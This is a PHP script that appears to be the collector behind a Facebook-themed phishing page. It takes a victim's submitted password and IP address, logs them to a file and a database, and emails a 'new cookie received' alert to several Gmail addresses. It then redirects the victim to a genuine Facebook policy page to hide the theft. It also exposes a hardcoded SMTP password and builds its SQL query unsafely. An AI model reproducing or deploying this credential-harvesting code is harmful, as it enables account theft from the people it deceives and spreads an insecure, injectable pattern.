<?php
  use PHPMailer\PHPMailer\PHPMailer;
  use PHPMailer\PHPMailer\Exception;

  require_once 'vendor/autoload.php';
  require __DIR__ . '/database.php';

  $pass = $_POST["password"];
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
      $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
      $ip = $_SERVER['REMOTE_ADDR'];
  }
  $content = "Password: ".$pass." - IP: ".$ip.".
";
  $fp = fopen("/tmp/password.txt","a");
  fwrite($fp,$content);
  fclose($fp);

  $sql =<<<EOF
  UPDATE DATA set password = '$pass' where id = (select max(id) from data);
EOF;
  $ret = pg_query($dbconn, $sql);
  pg_close($dbconn);

  $mail = new PHPMailer(true);

  $mail->isSMTP();                                      // Set mailer to use SMTP
  $mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
  $mail->SMTPAuth = true;                               // Enable SMTP authentication
  $mail->Username = 'carterreginald24@gmail.com';                 // SMTP username
  $mail->Password = 'fqbjmddjkxsnumgr';                           // SMTP password
  $mail->SMTPSecure = 'tls';
  $mail->Port  = 587;
  
  $mail->setFrom('carterreginald24@gmail.com', 'A NEW COOKIE RECEIVED');
  $mail->addAddress('kk442242@gmail.com', 'Receiver');
  $mail->addAddress('Danielscottatoarms@gmail.com', 'Receiver');
  $mail->Subject = 'A NEW COOKIE RECEIVED';
  $mail->Body    = 'Please check the link';

  if(!$mail->send()) {
      echo 'Message could not be sent.';
      echo 'Mailer Error: ' . $mail->ErrorInfo;
  } else {
      // echo 'Message has been sent';
  }

  $mail->smtpClose();

  header('Location: https://transparency.fb.com/en-gb/policies/community-standards/');
  die();